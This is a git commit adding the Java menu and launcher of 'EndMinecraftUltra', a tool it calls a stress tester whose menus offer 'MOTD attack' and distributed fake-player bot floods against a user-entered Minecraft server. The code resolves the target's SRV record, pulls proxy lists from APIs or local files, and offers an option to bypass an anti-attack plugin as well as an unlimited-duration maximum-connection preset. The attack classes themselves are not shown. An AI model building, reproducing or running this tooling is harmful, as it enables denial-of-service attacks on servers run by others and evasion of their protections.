a4832e0e4f1648d60ef5a748ab6b23ead67cd105
wangxyper <8943419+wangxyperQwQ@user.noreply.gitee.com>
2022-02-03 03:15:50 +0000

    添加源码&&keepalive数据包的自动回复

---
+++ src/main/java/co/akarin/endminecraftultra/main/Menu.java
@@ -0,0 +1,82 @@
+package co.akarin.endminecraftultra.main;
+
+
+import java.util.HashMap;
+import java.util.Scanner;
+
+import static co.akarin.endminecraftultra.utils.mainUtils.getCo;
+import static co.akarin.endminecraftultra.utils.mainUtils.log;
+import co.akarin.endminecraftultra.proxy.ProxyPool;
+import co.akarin.endminecraftultra.ATTACK.DistributedBotAttack;
+import co.akarin.endminecraftultra.ATTACK.IAttack;
+import co.akarin.endminecraftultra.ATTACK.MotdAttack;
+
+public class Menu {
+    private String ip;
+    private Scanner scanner;
+    private int port;
+
+    public Menu(Scanner sc, String ip, int port) {
+        this.ip = ip;
+        this.port = port;
+        this.scanner = sc;
+    }
+
+    public void _1() {
+        log("MOTD攻击选择");
+        log("请输入攻击时间(单位：秒)(默认60)");
+        int time = getCo(scanner.nextLine(),60);
+        log("请输入线程数(默认10)");
+        int thread = getCo(scanner.nextLine(),16);
+        IAttack attack = new MotdAttack(time,thread,0,false,false,null);
+        attack.start(ip, port);
+    }
+    public void antiAttiackMode(){
+        getProxy();
+        IAttack attack = new DistributedBotAttack(Integer.MAX_VALUE,Integer.MAX_VALUE,650,true,true,new HashMap<String,String>());
+        attack.start(ip, port);
+    }
+    public void _2() {
+        log("配置选择：1-自定义,2-Antiattack");
+        switch (getCo(scanner.nextLine(),1)) {
+            case 1:custom(); break;
+            case 2: antiAttiackMode(); break;
+            default: custom();
+        }
+    }
+    public void custom(){
+        log("分布式假人压测选择", "请输入压测时长！(默认3600s)");
+        int time = getCo(scanner.nextLine(),3600);
+        log("请输入最大连接数(默认10000)");
+        int maxAttack = getCo(scanner.nextLine(),10000);
+        log("请输入每次加入服务器间隔(ms)");
+        int sleepTime = getCo(scanner.nextLine(),0);
+        log("请输入是否开启TAB压测 y/n，默认关闭(n)");
+        boolean tab = getCo(scanner.nextLine(),"n").equals("y");
+        log("请输入是否开启AntiAttackRL绕过功能 y/n，默认关闭(n)");
+        boolean lele = getCo(scanner.nextLine(),"n").equals("y");
+        getProxy();
+        IAttack attack = new DistributedBotAttack(time,maxAttack,sleepTime,lele,tab,new HashMap<String,String>());
+        attack.start(ip, port);
+    }
+    public void getProxy() {
+        log("请输入代理ip列表获取方式（1）： 1.通过API获取 2.通过本地获取 3.通过本地+API获取(http.txt)");
+        switch (getCo(scanner.nextLine(),1)) {
+            case 1:
+                ProxyPool.getProxysFromAPIs();
+                ProxyPool.runUpdateProxysTask(1200);
+                break;
+            case 2:
+                ProxyPool.getProxysFromFile();
+                break;
+            case 3:
+                ProxyPool.getProxysFromFile();
+                ProxyPool.getProxysFromAPIs();
+                ProxyPool.runUpdateProxysTask(1200);
+                break;
+            default:
+                ProxyPool.getProxysFromAPIs();
+                ProxyPool.runUpdateProxysTask(1200);
+        }
+    }
+}
---
+++ src/main/java/co/akarin/endminecraftultra/main/main.java
@@ -0,0 +1,73 @@
+package co.akarin.endminecraftultra.main;
+
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.util.Hashtable;
+import java.util.Scanner;
+
+import javax.naming.NamingException;
+import javax.naming.directory.Attribute;
+import javax.naming.directory.InitialDirContext;
+
+
+import static co.akarin.endminecraftultra.utils.mainUtils.getCo;
+import static co.akarin.endminecraftultra.utils.mainUtils.log;
+
+public class main {
+    private static String ip;
+    public static int port = 25565;
+
+    private static Scanner scanner = new Scanner(System.in);
+
+
+    public static void main(String[] args) throws InterruptedException, IOException, IllegalAccessException, InstantiationException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, NamingException {
+        getInfo();
+        showMenu();
+    }
+
+    private static void getInfo() throws NamingException {
+        log("欢迎使用EndMinecraftUltra压测工具 协议库版本:1.18.1", "",  "=======================");
+        log("请输入服务器IP/域名地址");
+        ip = scanner.nextLine();
+        if (ip.contains(":")) {
+            String[] tmpip = ip.split(":");
+            ip = tmpip[0];
+            port = Integer.parseInt(tmpip[1]);
+        } else {
+            log("请输入端口(默认25565)");
+            port = getCo(scanner.nextLine(), 25565);
+        }
+        Hashtable<String, String> hashtable = new Hashtable<String, String>();
+        hashtable.put("java.naming.factory.initial", "com.sun.jndi.dns.DnsContextFactory");
+        hashtable.put("java.naming.provider.url", "dns:");
+        try {
+            Attribute qwqre = (new InitialDirContext(hashtable)).getAttributes((new StringBuilder()).append("_Minecraft._tcp.").append(ip).toString(), new String[]{"SRV"}).get("srv");
+            if (qwqre != null) {
+                String[] re = qwqre.get().toString().split(" ", 4);
+                log("检测到SRV记录，自动跳转到SRV记录");
+                ip = re[3];
+                log("ip: " + ip);
+                port = Integer.parseInt(re[2]);
+                log("port: " + port);
+            }
+        } catch (Exception e) {}
+    }
+
+    private static void showMenu() throws IOException, InterruptedException {
+        Menu menu = new Menu(scanner, ip, port);
+        while (true) {
+            log("请输入攻击方式：", "1 : MOTD攻击", "2 : 分布式假人压测(集群压测)");
+            log("========================");
+            switch (getCo(scanner.nextLine(), 2)) {
+                case 1:
+                    menu._1();
+                    return;
+                case 2:
+                    menu._2();
+                    return;
+                default:
+                    log("您的选择有误，请重新选择");
+            }
+        }
+    }
+}
